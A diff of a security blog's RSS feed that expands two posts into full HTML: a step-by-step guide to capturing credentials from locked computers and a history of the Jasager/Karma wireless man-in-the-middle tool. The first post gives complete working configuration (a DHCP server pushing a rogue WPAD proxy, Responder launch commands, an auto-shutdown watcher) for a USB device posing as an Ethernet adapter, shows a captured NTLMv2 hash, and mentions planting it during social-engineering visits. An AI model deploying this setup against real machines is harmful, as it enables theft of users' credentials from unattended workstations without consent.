@@ -8,7 +8,7 @@
     <language>en-us</language>
     <lastBuildDate>Tue, 06 Sep 2016 07:35:28 -0500</lastBuildDate>
     
-	<atom:link href="https://malicious.link/tags/hak5/index.xml" rel="self" type="application/rss+xml" />
+        <atom:link href="https://malicious.link/tags/hak5/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
@@ -17,9 +17,224 @@
       <pubDate>Tue, 06 Sep 2016 07:35:28 -0500</pubDate>
       
       <guid>https://malicious.link/post/2016/snagging-creds-from-locked-machines/</guid>
-      <description>First off, this is dead simple and shouldn&amp;rsquo;t work, but it does. Also, there is no possible way that I&amp;rsquo;m the first one that has identified this, but here it is (trust me, I tested it so many ways to confirm it because I couldn&amp;rsquo;t believe it was true)
-TL;DR USB Ethernet + DHCP + Responder == Creds
-Thesis: If I plug in a device that masquerades as a USB Ethernet adapter and has a computer on the other end, can I capture credentials from a system, even when locked out (yes, logged in, just locked).</description>
+      <description>
+
+&lt;p&gt;First off, this is dead simple and shouldn&amp;rsquo;t work, but it does. Also, there is no possible way that I&amp;rsquo;m the first one that has identified this, but here it is (&lt;strong&gt;trust me, I tested it so many ways to confirm it because I couldn&amp;rsquo;t believe it was true&lt;/strong&gt;)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt; USB Ethernet + DHCP + Responder == Creds&lt;/p&gt;
+
+&lt;h1 id=&#34;thesis&#34;&gt;Thesis:&lt;/h1&gt;
+
+&lt;p&gt;If I plug in a device that masquerades as a USB Ethernet adapter and has a computer on the other end, can I capture credentials from a system, even when locked out (yes, logged in, just locked). (..or do even more, but we&amp;rsquo;ll save that for another time, this post is already too long)&lt;/p&gt;
+
+&lt;h2 id=&#34;device-setup&#34;&gt;Device Setup&lt;/h2&gt;
+
+&lt;p&gt;I started off with a &lt;a href=&#34;https://inversepath.com/usbarmory&#34;&gt;USB Armory&lt;/a&gt; ($155) but below I&amp;rsquo;ll show you how to do this with a &lt;a href=&#34;http://hakshop.myshopify.com/collections/lan-turtle/products/lan-turtle&#34;&gt;Hak5 Turtle&lt;/a&gt; ($49.99) as well.&lt;/p&gt;
+
+&lt;p&gt;I&amp;rsquo;ll leave the setting up of the base device itself to you, but here are some links that can start you on your way:&lt;/p&gt;
+
+&lt;h3 id=&#34;usb-armory&#34;&gt;USB Armory&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Debian/Jessie - &lt;a href=&#34;https://github.com/inversepath/usbarmory/wiki/Starting#preparing-your-own-microsd-card&#34;&gt;https://github.com/inversepath/usbarmory/wiki/Starting#preparing-your-own-microsd-card&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Kali on USB Armory - &lt;a href=&#34;http://docs.kali.org/kali-on-arm/kali-linux-on-usb-armory&#34;&gt;http://docs.kali.org/kali-on-arm/kali-linux-on-usb-armory&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Resizing the SD partition - &lt;a href=&#34;http://base16.io/?p=61&#34;&gt;http://base16.io/?p=61&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;hak5-turtle&#34;&gt;Hak5 Turtle&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Turtle video guides and wiki: &lt;a href=&#34;https://lanturtle.com/wiki/#!videos.md&#34;&gt;https://lanturtle.com/wiki/#!videos.md&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;tools&#34;&gt;Tools&lt;/h2&gt;
+
+&lt;p&gt;Basically the capturing is done with &lt;a href=&#34;https://twitter.com/pythonresponder&#34;&gt;Laurent Gaffié&amp;rsquo;s&lt;/a&gt; &lt;a href=&#34;https://github.com/lgandx/Responder&#34;&gt;Responder&lt;/a&gt; so you need to find a way to get Responder onto the device. The Hak5 Turtle already has a module for it:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2016/turtleshell.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;You do have to &amp;ldquo;Enable&amp;rdquo; the module for the first time (plugged into Internet access) to get it to actually download all of dependencies and package itself.&lt;/p&gt;
+
+&lt;p&gt;Then you also need to do a &lt;code&gt;opkg update&lt;/code&gt; and &lt;code&gt;opkg install python-openssl&lt;/code&gt; so that Responder will run correctly. This is only a temporary issue as the module is being fixed to include this step.&lt;/p&gt;
+
+&lt;p&gt;As for the USB Armory is you can either use SCP, Internet Connection Sharing, the USB host/client adapter:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2016/usbarmory_host_adapter.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The default install of Debian/Jessie doesn&amp;rsquo;t have Python installed so you will have to work through all of the dependencies (on the Kali version this is not needed) and will require Internet access to perform:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;apt-get install -y python git python-pip python-dev screen sqlite3
+pip install pycrypto
+git clone https://github.com/spiderlabs/responder
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;configuration&#34;&gt;Configuration&lt;/h2&gt;
+
+&lt;h3 id=&#34;armory&#34;&gt;Armory&lt;/h3&gt;
+
+&lt;p&gt;First, setting up the interface isn&amp;rsquo;t needed but it will help with consistence since each image for the Armory come with different default IP addresses and it&amp;rsquo;s good to set a solid base.&lt;/p&gt;
+
+&lt;h4 id=&#34;etc-network-interfaces&#34;&gt;/etc/network/interfaces&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code&gt;# interfaces(5) file used by ifup(8) and ifdown(8)
+# Include files from /etc/network/interfaces.d:
+source-directory /etc/network/interfaces.d
+auto usb0
+allow-hotplug usb0
+iface usb0 inet static
+  address 192.168.2.201
+  netmask 255.255.255.0
+  gateway 192.168.2.1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Next we set up the DHCP server:&lt;/p&gt;
+
+&lt;h4 id=&#34;etc-dhcp-dhcpd-conf&#34;&gt;/etc/dhcp/dhcpd.conf&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code&gt;ddns-update-style none;
+
+option domain-name &amp;quot;domain.local&amp;quot;;
+option domain-name-servers 192.168.2.201;
+
+default-lease-time 60;
+max-lease-time 72;
+
+# If this DHCP server is the official DHCP server for the local
+# network, the authoritative directive should be uncommented.
+authoritative;
+
+# Use this to send dhcp log messages to a different log file (you also
+# have to hack syslog.conf to complete the redirection).
+log-facility local7;
+
+# wpad
+option local-proxy-config code 252 = text;
+
+# A slightly different configuration for an internal subnet.
+subnet 192.168.2.0 netmask 255.255.255.0 {
+  range 192.168.2.1 192.168.2.2;
+  option routers 192.168.2.201;
+  option local-proxy-config &amp;quot;http://192.168.2.201/wpad.dat&amp;quot;;
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The only special configuration here is to send the &amp;ldquo;Proxy Config&amp;rdquo; option to any DHCP clients. Why this is even a thing I have no idea, but note this line:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&amp;ldquo;DHCP has a higher priority than DNS: if DHCP provides the WPAD URL, no DNS lookup is performed.&amp;rdquo;&lt;/strong&gt; from &lt;a href=&#34;https://en.wikipedia.org/wiki/Web_Proxy_Autodiscovery_Protocol&#34;&gt;the Wikipedia article on WPAD&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Next we set up things to automatically run. We edit the &lt;code&gt;rc.local&lt;/code&gt; file so that it does a few things:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Clears out all DHCP leases and start the DHCP server&lt;/strong&gt;. There is probably a more elegant way to do this, but because this &amp;ldquo;computer&amp;rdquo; is being plugged in and taken out pretty frequently, we could run into a max in leases but most likely the file will get corrupted at some point so we just remove and re-add it.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Start Responder in a screen session&lt;/strong&gt;. This way we can get logging going on the screen session as a sort of backup for the Sqlite3 database and log files that Responder creates.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h4 id=&#34;etc-rc-local&#34;&gt;/etc/rc.local&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code&gt;#!/bin/sh -e
+
+# Clear leases
+rm -f /var/lib/dhcp/dhcpd.leases
+touch /var/lib/dhcp/dhcpd.leases
+
+# Start DHCP server
+/usr/sbin/dhcpd
+
+# Start Responder
+/usr/bin/screen -dmS responder bash -c &#39;cd /root/responder/; python Responder.py -I usb0 -f -w -r -d -F&#39;
+
+exit 0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;To enable logging of the screen sessions (which also gives you insight into if anything went wrong), you add a &lt;code&gt;.screenrc&lt;/code&gt; file. There is a lot more that I put in these, mostly for aesthetics but the important pieces are these:&lt;/p&gt;
+
+&lt;h4 id=&#34;root-screenrc&#34;&gt;/root/.screenrc&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code&gt;# Logging
+deflog on
+logfile /root/logs/screenlog_$USER_.%H.%n.%Y%m%d-%0c:%s.%t.log
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;That&amp;rsquo;s it, you should be able to reboot your USB Armory and start picking up creds anywhere you can stick a USB in.&lt;/p&gt;
+
+&lt;h3 id=&#34;hak5-turtle-1&#34;&gt;Hak5 Turtle&lt;/h3&gt;
+
+&lt;p&gt;Everything is pretty much already done for you, the only difference is that opkg is your package manager:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;opkg update
+opkg install python-openssl screen
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Remove the symlink to /tmp/ so that the logs will stick around&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;rm -rf /overlay/etc/turtle/Responder/logs
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And the &lt;code&gt;/overlay/etc/rc.local&lt;/code&gt; file is slightly different&lt;/p&gt;
+
+&lt;h4 id=&#34;overlay-etc-rc-local&#34;&gt;/overlay/etc/rc.local&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code&gt;/etc/init.d/dnsmasq stop
+/usr/sbin/screen -dmS responder bash -c &#39;cd /overlay/etc/turtle/Responder; python Responder.py -I br-lan -f -w -r -d -F&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&#34;why-does-this-work&#34;&gt;Why does this work?&lt;/h1&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Because USB is Plug-and-Play. This means that even if a system is locked out, the device still gets installed. Now, I believe there are restrictions on what types of devices are allowed to install at a locked out state on newer operating systems (Win10/El Capitan), but Ethernet/LAN is definitely on the white list.&lt;/li&gt;
+&lt;li&gt;Computers are constantly creating traffic, even if you don&amp;rsquo;t have any browsers or applications open, and most computers trust their local network for some reason (I know the technical bits on &amp;lsquo;why&amp;rsquo;, just complaining&amp;hellip;)&lt;/li&gt;
+&lt;li&gt;Network preference when there are more than gateway or network connection is based on &amp;ldquo;metrics&amp;rdquo; on Windows and a combination of metrics and &lt;a href=&#34;https://support.apple.com/kb/PH18458?locale=en_US&#34;&gt;&amp;ldquo;preference&amp;rdquo; on OSX&lt;/a&gt;, but by default &amp;ldquo;wired&amp;rdquo; and &amp;ldquo;newer/faster&amp;rdquo; always win out.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;This means that by plugging in the device it quickly becomes the gateway, DNS server, WPAD server and others thanks to Responder.&lt;/p&gt;
+
+&lt;p&gt;The average time for freshly inserted into a locked workstation and by the time I have creds is about 13 seconds, all depends on the system. Some addition setup I used inotify to watch for a file change in the &lt;code&gt;Responder.db&lt;/code&gt; database and shutdown the Armory. This helps finalize file writes as well and giving me an indicator via the LED that creds were obtained.&lt;/p&gt;
+
+&lt;p&gt;To do that you need to install the &lt;code&gt;inotify-tools&lt;/code&gt; package and add the following to the &lt;code&gt;rc.local&lt;/code&gt; file:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;echo &amp;quot;Staring cred watch&amp;quot; &amp;gt;&amp;gt; /root/rc.log
+/usr/bin/screen -dmS notify bash -c &#39;while inotifywait -e modify /root/responder/Responder.db; do shutdown -h now; done&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&#34;end-result&#34;&gt;End Result:&lt;/h1&gt;
+
+&lt;p&gt;What you see in the video is the Windows 10 lock screen (Full screened fresh install VM). When the LED goes solid white the Armory has fully shutdown because of the watch script, creds achieved!.&lt;/p&gt;
+
+
+&lt;div style=&#34;position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;&#34;&gt;
+  &lt;iframe src=&#34;//www.youtube.com/embed/Oplubg5q7ao&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;&#34; allowfullscreen title=&#34;YouTube Video&#34;&gt;&lt;/iframe&gt;
+&lt;/div&gt;
+
+
+&lt;p&gt;Bring it back home and look at the results:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@wpad:~# sqlite3 /root/responder/Responder.db &#39;select * from responder&#39;
+2016-09-04 10:59:43|HTTP|NTLMv2|192.168.2.1||SITTINGDUCK\mubix||5EAEA2859C397D8AE48CA87F:01010000000001E9D23F49F7891F38965D80A0010000000000000000000000000000000900260048005400540050002F007800780066006600730062006E0070006300000000000000....
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Sweet!! Game over!&lt;/p&gt;
+
+&lt;p&gt;Tested on:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Windows 98 SE&lt;/li&gt;
+&lt;li&gt;Windows 2000 SP4&lt;/li&gt;
+&lt;li&gt;Windows XP SP3&lt;/li&gt;
+&lt;li&gt;Windows 7 SP1&lt;/li&gt;
+&lt;li&gt;Windows 10 (Enterprise and Home)&lt;/li&gt;
+&lt;li&gt;OSX El Capitan / Mavericks (I was able to get creds on both of these but I&amp;rsquo;m still testing to see if it was a fluke, or my own configurations)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I still have not tested on Linux, I will make a new post on if that works. Please leave comments below if you see things I can improve upon, or errors.&lt;/p&gt;
+
+&lt;h3 id=&#34;usb-armory-vs-hak5-lan-turtle&#34;&gt;USB Armory vs Hak5 LAN Turtle&lt;/h3&gt;
+
+&lt;ol&gt;
+&lt;li&gt;The Armory is more versitile with APT package to do more fun, definitely a great way to dev the attack. More storage (SD based) and slightly faster processor&lt;/li&gt;
+&lt;li&gt;Hak5 LAN Turtle is MUCH easier to pass off when you are trying to plug in a device during an SE attack. It might not have the LED that the Armory does for determining when creds are achieved, but it has the added functionality of a working ethernet port, so you could get creds AND a shell. Definitely worth the extra hassel to get it working right.&lt;/li&gt;
+&lt;/ol&gt;
+</description>
     </item>
     
     <item>
@@ -28,8 +243,44 @@ Thesis: If I plug in a device that masquerades as a USB Ethernet adapter and has
       <pubDate>Sat, 12 May 2012 11:30:44 -0500</pubDate>
       
       <guid>https://malicious.link/post/2012/jasager-past-present-future/</guid>
-      <description>If you haven&amp;rsquo;t heard already about Jasager.. well you probably don&amp;rsquo;t read this blog, but for those who want to know a bit more about the history of Jasager - Karma on the Fon, where the project is now, and where it&amp;rsquo;s headed, then buckle up, and hang on while we first travel down memory lane.
-History: The time was ShmooCon 2006. It was my very first &amp;ldquo;HACKER&amp;rdquo; convention. I was there with my buddies from Hak5 and SploitCast.</description>
+      <description>
+
+&lt;p&gt;If you haven&amp;rsquo;t heard already about Jasager.. well you probably don&amp;rsquo;t read this blog, but for those who want to know a bit more about the history of Jasager - Karma on the Fon, where the project is now, and where it&amp;rsquo;s headed, then buckle up, and hang on while we first travel down memory lane.&lt;/p&gt;
+
+&lt;h2 id=&#34;history&#34;&gt;History:&lt;/h2&gt;
+
+&lt;p&gt;The time was ShmooCon 2006. It was my very first &amp;ldquo;HACKER&amp;rdquo; convention. I was there with my buddies from Hak5 and SploitCast. I just so happened to sit in a talk by Dino (A. Dai Zovi). He was talking about Karma, his project that basically sat in the middle of wireless connections and instead of picking out the special bits directed his way, Karma accepted and responded to them all. I was in love, no not with Dino, but the project. I wrote theta44.org in my notebook and continued on with the craziness that is any con. Having no money to invest in a wireless card that could handle Karma that page with theta44.org kept hounding me.&lt;/p&gt;
+
+&lt;p&gt;In early 2007, boxgamex (a gentlemen from the Hak5 community) sold me a little Fonera router. What&amp;rsquo;s the first thing I did? Hack it, put OpenWRT and DD-WRT on it. But one day that page in my notebook showed up again and reminded me of Karma. I looked on Dino&amp;rsquo;s page and was appalled to find that the project hadn&amp;rsquo;t gone anywhere. Did no one see the potential that this project had? Putting 2 + 2 (=5) I decided to put Karma on the Fon for an ultra portable wifi attack tool. Well, I am by no means the Killer Coding Ninja Monkey that either Dino or Robin Wood are. I scripted my way into it working for one target at a time. The problem? I did all the work on the Fon. You can see where this is going. At DEFCON 15, I brought my scripted up Fon to test it out in the shark infested waters (Wall of Sheep addition?). Got excited to be there, booted the Fon up in my room, connected to the Fon and change a setting. The Fon bricked. No proof that I had done anything, didn&amp;rsquo;t even get the chance to test it out.&lt;/p&gt;
+
+&lt;p&gt;I explained what had happened to my friend Darren Kitchen, and the project really sparked in him. He talked to the Killer Coding Ninja Monkey that I mentioned before Robin Wood, and before you know it, the project was renewed under a new name &amp;ldquo;Jasager&amp;rdquo;, and this time with a better hand at the wheel.&lt;/p&gt;
+
+&lt;p&gt;Enough of the history lesson, lets get some information.&lt;/p&gt;
+
+&lt;p&gt;Here is the home page of Jasager: &lt;a href=&#34;http://www.digininja.org/jasager/index.php&#34;&gt;http://www.digininja.org/jasager/index.php&lt;/a&gt;
+HINT: Digininja&amp;rsquo;s main site, while lacking style has some things that you also want to check out. (digininja.org)&lt;/p&gt;
+
+&lt;p&gt;If you like reading, here is Darren&amp;rsquo;s blog post on how to get Jasager going:
+&lt;a href=&#34;http://www.darrenkitchen.net/jasager-step-by-step-unlocking-install-guide&#34;&gt;http://www.darrenkitchen.net/jasager-step-by-step-unlocking-install-guide&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;If you are more of a visual person, check out episode 405 of Hak5:
+&lt;a href=&#34;http://www.hak5.org/episodes/episode-405&#34;&gt;http://www.hak5.org/episodes/episode-405&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;And if you have problems or want to discuss options and configurations with other Jasager
+&lt;a href=&#34;http://hak5.org/forums/index.php?showforum=49&#34;&gt;http://hak5.org/forums/index.php?showforum=49&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;back-to-the-furture&#34;&gt;Back to the Furture:&lt;/h2&gt;
+
+&lt;p&gt;MITM attacks on computer systems have been around since the dawn of time. The natural (rapid) progression of security attacks made it guaranteed that MITM would hit Wireless just as hard.  If you have ever talked on a CB Radio, you know the frustration when the kids with the high powered antenna start playing the Mortal Kombat soundtrack over the CB without letting up. This is a simple example of how Jasager works. It gets in the middle of wireless communications. How do you protect against something like that? I don&amp;rsquo;t know. I don&amp;rsquo;t believe that there is a protection for Jasager or Karma (again, released in 2006). Where is Jasager heading? I think that adding the functionality of Karmetasploit (H.D. Moore&amp;rsquo;s project) to a portable device and then maybe shipping that device like the guys over at Errata Security did with an iPhone, would be one dangerous route. Or puttying it in a box like Richard Mogull did. Or in a wall like Larry Pesce did.&lt;/p&gt;
+
+&lt;p&gt;To the future? What if I could put this whole project on a USB stick that didn&amp;rsquo;t do anything but draw power so it could run Jasager + Karmetasploit? Maybe running it on the NeoPwn? The possibilities are endless with this project. For all those feed readers out there, you can keep up with the latest and greatest form Robin Wood and the Jasager project via their RSS feed.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://www.metasploit.com/dev/trac/wiki/Karmetasploit&#34;&gt;http://www.metasploit.com/dev/trac/wiki/Karmetasploit&lt;/a&gt;
+Dino&amp;rsquo;s Link: &lt;a href=&#34;http://blog.trailofbits.com/&#34;&gt;http://blog.trailofbits.com/&lt;/a&gt;
+Dino&amp;rsquo;s Twitter: &lt;a href=&#34;http://twitter.com/dinodaizovi&#34;&gt;http://twitter.com/dinodaizovi&lt;/a&gt;
+Karma&amp;rsquo;s Links: &lt;a href=&#34;http://blog.trailofbits.com/karma/&#34;&gt;http://blog.trailofbits.com/karma/&lt;/a&gt;
+Boxgamex&amp;rsquo;s Link: &lt;a href=&#34;http://twitter.com/boxgamex&#34;&gt;http://twitter.com/boxgamex&lt;/a&gt;&lt;/p&gt;
+</description>
     </item>
     
   </channel>
